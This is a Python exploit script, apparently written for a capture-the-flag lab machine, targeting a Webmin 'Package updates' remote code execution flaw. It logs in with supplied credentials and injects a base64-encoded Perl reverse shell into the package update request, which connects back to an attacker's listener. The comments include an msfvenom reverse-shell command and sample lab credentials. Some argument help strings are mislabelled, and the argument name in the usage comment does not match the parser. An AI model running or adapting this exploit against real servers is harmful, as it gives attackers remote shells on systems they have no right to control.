#!/usr/bin/python3

#intro
#get inputs
#check for vuln
#exploit

#msfvenom -p cmd/unix/reverse_perl lhost=10.10.10.160 lport=4444
#python3 exploit_poc.py --lhost=10.10.10.160 --lport=4444
#python3 exploit_poc.py --lhost=10.10.14.25 --lport=4433 --ip_address=10.10.10.160 --user=Matt --pass=computer2008

import requests
import argparse
import sys
import base64
import urllib.parse
from requests.packages.urllib3.exceptions import InsecureRequestWarning



def banner():
	"""
	This function print a fancy banner
	"""
	print("\033[32m")
	print("Webmin 1.9101- 'Package updates' RCE")
	print("\033[0m")


def payload(lhost_add, lport_add):
	perl_payload="perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\"" + str(lhost_add) + ":" + str(lport_add) + "\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'"
	b64_payload = base64.b64encode(perl_payload.encode("utf-8"))
	b64payload_Str = str(b64_payload, "utf-8")
	bash_payload = 'bash -c "{echo,' + b64payload_Str + '}|{base64,-d}|{bash,-i}"'
	url_encoded_payload = urllib.parse.quote(bash_payload)
	final_payload = "u=acl%2Fapt&u=%20%7C%20" + url_encoded_payload + "&ok_top=Update+Selected+Packages"
	return final_payload


def exploit(url, payload, username, password):
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
	login_payload={'user': username ,'pass': password}
	revshell_payload= payload
	url_login= url+'/session_login.cgi'
	url_updates=url+'/package-updates/update.cgi'
	print(login_payload)
	print(revshell_payload)
	print(url_login)
	print(url_updates)
	cookies = {'redirect':'1','testing':'1','sid':'x'}
	s= requests.Session()
	headers = {'referer': url}
	response = s.post(url_login, data=login_payload, allow_redirects=False, verify=False, cookies=cookies )
	s.post(url_updates, data=revshell_payload, headers=headers, verify=False)
	print('completed')
	


def main():
	parser = argparse.ArgumentParser(description='http://staging-order.mango.htb/')
	parser.add_argument('--ip_address',help='Enter IP address of the Webmin')
	parser.add_argument('--port',help='Enter port value of the Webmin', default=10000)
	parser.add_argument('--lhost',help='Enter listener IP address (Attackers IP)')
	parser.add_argument('--lport',help='Enter listener port (Attackers port)')
	parser.add_argument('--user',help='Enter listener IP address (Attackers IP)')
	parser.add_argument('--password',help='Enter listener port (Attackers port)')
	args = parser.parse_args()
	final_payload=payload(args.lhost, args.lport)
	url_webmin='https://' + str(args.ip_address) + ':' + str(args.port)
	exploit(url_webmin, final_payload, args.user, args.password)



if __name__ == "__main__":
	main()



